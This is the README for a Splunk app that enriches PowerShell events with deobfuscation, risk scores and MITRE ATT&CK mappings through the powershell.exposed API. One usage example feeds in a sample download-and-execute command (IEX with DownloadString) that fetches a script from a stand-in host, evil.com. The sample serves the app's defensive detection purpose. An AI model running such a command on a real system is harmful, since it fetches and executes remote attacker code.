# PSExposed — Splunk App for powershell.exposed

Analyze and deobfuscate PowerShell commands directly from Splunk using the [powershell.exposed](https://powershell.exposed) API. Enriches events with risk scores, MITRE ATT&CK techniques, deobfuscated output, and AI-generated summaries.

## Prerequisites

- **Splunk Enterprise 8.x+** or **Splunk Cloud**
- **Python 3** (included with Splunk 8+)
- A **powershell.exposed** account and API key (get one at [powershell.exposed](https://powershell.exposed))
- The `requests` Python library (see installation steps)

## Installation

### Step 1: Install the app

Copy the `psexposed_app` folder into your Splunk apps directory:

```bash
# On Linux/Mac
cp -r psexposed_app/ $SPLUNK_HOME/etc/apps/

# On Windows
xcopy /E /I psexposed_app "%SPLUNK_HOME%\etc\apps\psexposed_app"
```

### Step 2: Install Python dependencies

The app needs the `requests` and `splunk-sdk` libraries. Install them into the app's `bin/lib` directory so Splunk can find them:

```bash
# Navigate to the app's bin/lib directory
cd $SPLUNK_HOME/etc/apps/psexposed_app/bin/lib

# Install dependencies there
pip3 install requests splunk-sdk --target .
```

### Step 3: Restart Splunk

```bash
$SPLUNK_HOME/bin/splunk restart
```

### Step 4: Configure your API key

1. Open Splunk Web (usually `http://localhost:8000`)
2. Navigate to **Apps > PSExposed - PowerShell Analyzer**
3. You'll be prompted to complete setup since the app is unconfigured
4. Click **Setup** or go to **Settings > PSExposed Configuration**
5. Enter your API key (starts with `pse_`)
6. Leave the Base URL as default unless you're self-hosting
7. Click **Save Configuration**

Each Splunk user must configure their own API key — keys are stored per-user using Splunk's encrypted credential storage.

## Usage

### Custom Search Command: `psexposed`

The `psexposed` command is a streaming command that analyzes PowerShell commands and adds enrichment fields to your events.

**Basic syntax:**
```spl
... | psexposed field=<field_name> [rate_limit_delay=<seconds>]
```

**Parameters:**
| Parameter | Default | Description |
|-----------|---------|-------------|
| `field` | `ps_command` | Event field containing the PowerShell command |
| `rate_limit_delay` | `0.2` | Seconds between API calls (rate limiting) |

**Output fields added to each event:**
| Field | Description |
|-------|-------------|
| `ps_risk_level` | Severity: `very_low`, `low`, `medium`, `high`, `critical` |
| `ps_risk_score` | Numeric risk score (0–999.9) |
| `ps_techniques` | MITRE ATT&CK technique IDs (comma-separated) |
| `ps_tactics` | MITRE ATT&CK tactics (comma-separated) |
| `ps_signatures` | Detected signature names (comma-separated) |
| `ps_deobfuscated` | Deobfuscated PowerShell command |
| `ps_decoded` | Base64-decoded command (if applicable) |
| `ps_summary` | AI-generated analysis summary |
| `ps_analysis_id` | Unique analysis ID for reference |
| `ps_error` | Error message (only if analysis failed) |

### Examples

**Analyze a single command:**
```spl
| makeresults
| eval ps_command="IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')"
| psexposed field=ps_command
```

**Analyze PowerShell ScriptBlock logs:**
```spl
index=windows sourcetype=WinEventLog:Security EventCode=4104
| psexposed field=ScriptBlockText
```

**Analyze with slower rate limiting:**
```spl
| inputlookup suspicious_commands.csv
| psexposed field=command rate_limit_delay=1.0
```

**Risk breakdown:**
```spl
index=windows EventCode=4104
| psexposed field=ScriptBlockText
| stats count by ps_risk_level
```

### Dashboard

The app includes a built-in dashboard at **PSExposed - PowerShell Analyzer** with:

1. **Manual Analysis** — Paste a command and analyze it instantly
2. **Bulk Analysis** — Run against your indexed PowerShell logs
3. **Risk Overview** — Pie chart of risk levels and top MITRE techniques

## Troubleshooting

**"No API key configured" error:**
- Go to the app setup page and enter your API key
- Each user needs their own key

**"Cannot connect to psexposed API" error:**
- Check that your Splunk server can reach `https://powershell.exposed`
- If behind a proxy, configure Python's proxy settings

**"Rate limited" error:**
- Increase `rate_limit_delay` (e.g., `rate_limit_delay=1.0`)
- Your API plan may have request limits — check your account

**Command not found:**
- Restart Splunk after installing the app
- Check that `commands.conf` is in the `default/` directory

## Security

- API keys are stored using Splunk's encrypted `storage/passwords` facility
- Each user's key is isolated in its own realm (`psexposed__<username>`)
- No credentials are written to disk in plaintext
- The app makes no filesystem writes (Splunk Cloud compatible)

## License

This app is provided as-is for use with the powershell.exposed platform.
